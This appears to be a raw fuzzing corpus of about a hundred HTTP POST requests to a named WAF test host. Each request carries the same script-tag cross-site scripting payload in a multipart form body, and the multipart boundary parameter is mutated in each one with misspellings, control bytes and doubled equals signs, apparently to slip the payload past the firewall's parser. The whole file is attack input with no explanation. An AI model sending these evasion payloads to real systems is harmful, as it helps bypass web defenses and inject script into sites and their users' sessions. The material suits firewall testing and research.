POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 879\r\nContent-Type: multipart/form-data; boundary=\x18oundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 943\r\nContent-Type: multipart/form-data; b\nundayboundarybouXnda"ry;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 39\r\nContent-Type: multipart/form-data; bou\x1cdary=ounVary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 103\r\nContent-Type: multipart/form-data; boudary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 167\r\nContent-Type: multipart/form-data; boundaryvbo\x07undary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 231\r\nContent-Type: multipart/form-data; boundary=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 295\r\nContent-Type: multipart/form-data; oundary==boudar\t;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 359\r\nContent-Type: multipart/form-data; boundary=boundarn;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 423\r\nContent-Type: multipart/form-data; ==bouniry;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 487\r\nContent-Type: multipart/form-data; boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 551\r\nContent-Type: multipart/form-data; boun8da4ry=Ybou\x01ndar;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 615\r\nContent-Type: multipart/form-data; bondary==bou$ndary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 679\r\nContent-Type: multipart/form-data; ;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 743\r\nContent-Type: multipart/form-data; boundary=2oeWundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 807\r\nContent-Type: multipart/form-data; boundarybound\x1dry=;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 871\r\nContent-Type: multipart/form-data; boun.dary=bound\\l;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 935\r\nContent-Type: multipart/form-data; boundaryEo~\x0endy;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 999\r\nContent-Type: multipart/form-data; bounda\try=boundarrybound\x07y=bunday;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 20\r\nContent-Type: multipart/form-data; ;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 84\r\nContent-Type: multipart/form-data; boundMary==;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 148\r\nContent-Type: multipart/form-data; =boundaryboundarynoun\x03dary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 212\r\nContent-Type: multipart/form-data; =boundary&b\x04undar)y;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 276\r\nContent-Type: multipart/form-data; boundyboundryboundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 340\r\nContent-Type: multipart/form-data; boundary=#udary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 404\r\nContent-Type: multipart/form-data; bWoundary=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 468\r\nContent-Type: multipart/form-data; bundaryboundaTry=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 532\r\nContent-Type: multipart/form-data; b\x11ouJndary=bsundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 596\r\nContent-Type: multipart/form-data; \x1cundary\x05oundary=bounda\x03Ny;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 660\r\nContent-Type: multipart/form-data; boundary=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 724\r\nContent-Type: multipart/form-data; boKudary==bounrary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 788\r\nContent-Type: multipart/form-data; boundaryiboundaryboundar=bo]ndary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 852\r\nContent-Type: multipart/form-data; bou\x12nary==-b\x1cu\x1cda"y;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 916\r\nContent-Type: multipart/form-data; bou\x11ndar\x02y=\x18boluZ|\x10d\'ry;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 980\r\nContent-Type: multipart/form-data; bogun\x0fdry=boudary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 14\r\nContent-Type: multipart/form-data; boundary=bou"ndary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 78\r\nContent-Type: multipart/form-data; Sbovundary=;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 142\r\nContent-Type: multipart/form-data; ====\x7f\xc2\xab%oundar\x15y;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 206\r\nContent-Type: multipart/form-data; boundary=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 270\r\nContent-Type: multipart/form-data; boun\x02dary=lboundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 334\r\nContent-Type: multipart/form-data; boundcarybounda5ry;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 398\r\nContent-Type: multipart/form-data; bSunda\x13r3\x0eundaryboundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 462\r\nContent-Type: multipart/form-data; bund\x16ary\x0cbu\x17d!y;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 526\r\nContent-Type: multipart/form-data; boundaroyboundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 590\r\nContent-Type: multipart/form-data; boundary=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 654\r\nContent-Type: multipart/form-data; boundar\x0b=bound]r\xc2\xbby;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 718\r\nContent-Type: multipart/form-data; bounday=boTn$ar;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 782\r\nContent-Type: multipart/form-data; b\x13ounda*yb{unar;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 846\r\nContent-Type: multipart/form-data; boundary=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 910\r\nContent-Type: multipart/form-data; boundaryboundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 974\r\nContent-Type: multipart/form-data; \nboundy=2ouSdary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 18\r\nContent-Type: multipart/form-data; boundarybo=ndaryboundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 82\r\nContent-Type: multipart/form-data; boun|dary==boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 146\r\nContent-Type: multipart/form-data; boundary=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 210\r\nContent-Type: multipart/form-data; b\x7fundaryboundarybounary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 274\r\nContent-Type: multipart/form-data; boundary=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 338\r\nContent-Type: multipart/form-data; boundar=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 402\r\nContent-Type: multipart/form-data; boundaP\x00\x15=boundary=bo\x00unCary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 466\r\nContent-Type: multipart/form-data; boundary=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 530\r\nContent-Type: multipart/form-data; boundary=oundayounedary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 594\r\nContent-Type: multipart/form-data; bou%ndary==boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 658\r\nContent-Type: multipart/form-data; bounday=bounda:ry;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 722\r\nContent-Type: multipart/form-data; boundaryboundaryb"una\x7fry;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 786\r\nContent-Type: multipart/form-data; boundary=boundarybondryboundaryboundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 850\r\nContent-Type: multipart/form-data; boundarybo\tdarybQoundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 914\r\nContent-Type: multipart/form-data; boundary=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 978\r\nContent-Type: multipart/form-data; boundm!ryoundary=;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 3\r\nContent-Type: multipart/form-data; bMudary=boundury;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 67\r\nContent-Type: multipart/form-data; boundary==boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 131\r\nContent-Type: multipart/form-data; boudar}y==boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 195\r\nContent-Type: multipart/form-data; =;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 259\r\nContent-Type: multipart/form-data; boundary=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 323\r\nContent-Type: multipart/form-data; boundary=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 387\r\nContent-Type: multipart/form-data; ==;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 451\r\nContent-Type: multipart/form-data; boundary=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 515\r\nContent-Type: multipart/form-data; bo\x0cundaryboundaryboundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 579\r\nContent-Type: multipart/form-data; =boundaryboundr5y;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 643\r\nContent-Type: multipart/form-data; boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 707\r\nContent-Type: multipart/form-data; boundary=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 771\r\nContent-Type: multipart/form-data; boundaryYounay;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 835\r\nContent-Type: multipart/form-data; =boundary=buz:d`ary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 899\r\nContent-Type: multipart/form-data; boundary=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 963\r\nContent-Type: multipart/form-data; ouHdary=bound\x01a-fy=;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 24\r\nContent-Type: multipart/form-data; =bWoundaryboundary=;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 88\r\nContent-Type: multipart/form-data; boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 152\r\nContent-Type: multipart/form-data; oundar=bou\x16ary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 216\r\nContent-Type: multipart/form-data; bundary=bondar;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 280\r\nContent-Type: multipart/form-data; bPundGry=boundar;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 344\r\nContent-Type: multipart/form-data; bougQy=boun\x00ary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 408\r\nContent-Type: multipart/form-data; baunarybondary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 472\r\nContent-Type: multipart/form-data; boundaryboundaryboundaryboundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 536\r\nContent-Type: multipart/form-data; bounda\\yboundaryFoundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 600\r\nContent-Type: multipart/form-data; bozndary=ounda/ry;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 664\r\nContent-Type: multipart/form-data; ==bouK\x06d;ar;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 728\r\nContent-Type: multipart/form-data; boundary=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 792\r\nContent-Type: multipart/form-data; b%undrbounbary=]oundaAy;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
